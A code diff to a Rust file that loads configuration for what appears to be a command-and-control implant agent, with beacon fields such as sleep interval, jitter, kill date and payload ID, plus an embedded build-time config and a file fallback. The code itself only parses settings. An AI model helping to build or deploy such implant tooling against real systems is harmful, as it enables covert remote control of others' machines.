@@ -1,7 +1,12 @@
 use serde::{Deserialize, Serialize};
 use std::fs;
 use std::io;
+use std::path::Path;
+use std::env;
 use uuid::Uuid;
+
+// Include the generated config file
+include!(concat!(env!("OUT_DIR"), "/config.rs"));
 
 #[derive(Serialize, Deserialize, Clone)]
 pub struct AgentConfig {
@@ -9,32 +14,62 @@ pub struct AgentConfig {
     pub sleep_interval: u64,
     pub jitter: u64,
     pub kill_date: Option<String>,
+    pub payload_id: String,
+    pub protocol: String,
 }
 
 impl Default for AgentConfig {
     fn default() -> Self {
         Self {
-            server_url: String::from("0.0.0.0:8080"),  // Remove http:// from default
+            server_url: String::new(), // Empty string by default to force error if no config
             sleep_interval: 5,
             jitter: 2,
             kill_date: None,
+            payload_id: String::new(), // Empty string by default
+            protocol: String::from("http"),
         }
     }
 }
 
 impl AgentConfig {
     pub fn load() -> io::Result<Self> {
-        match fs::read_to_string("config.json") {
-            Ok(contents) => Ok(serde_json::from_str(&contents)?),
-            Err(_) => Ok(Self::default())
+        // First try using the embedded config
+        if let Ok(config) = serde_json::from_str::<AgentConfig>(EMBEDDED_CONFIG) {
+            if !config.server_url.is_empty() && !config.payload_id.is_empty() {
+                println!("[INFO] Using embedded configuration");
+                return Ok(config);
+            }
+            println!("[WARNING] Embedded config invalid (missing server_url or payload_id)");
+        } else {
+            println!("[WARNING] Failed to parse embedded config");
         }
+        
+        // Try filesystem config as fallback
+        if let Ok(exe_path) = env::current_exe() {
+            let exe_dir = exe_path.parent().unwrap_or(Path::new("."));
+            let config_path = exe_dir.join("config.json");
+            
+            if config_path.exists() {
+                if let Ok(contents) = fs::read_to_string(&config_path) {
+                    if let Ok(config) = serde_json::from_str::<AgentConfig>(&contents) {
+                        if !config.server_url.is_empty() && !config.payload_id.is_empty() {
+                            println!("[INFO] Loaded valid config from {}", config_path.display());
+                            return Ok(config);
+                        }
+                    }
+                }
+            }
+        }
+
+        // No valid config found
+        Err(io::Error::new(io::ErrorKind::NotFound, "No valid configuration found"))
     }
 
     pub fn get_server_url(&self) -> String {
-        if self.server_url.starts_with("http://") {
+        if self.server_url.starts_with("http://") || self.server_url.starts_with("https://") {
             self.server_url.clone()
         } else {
-            format!("http://{}", self.server_url)
+            format!("{}://{}", self.protocol, self.server_url)
         }
     }
 }
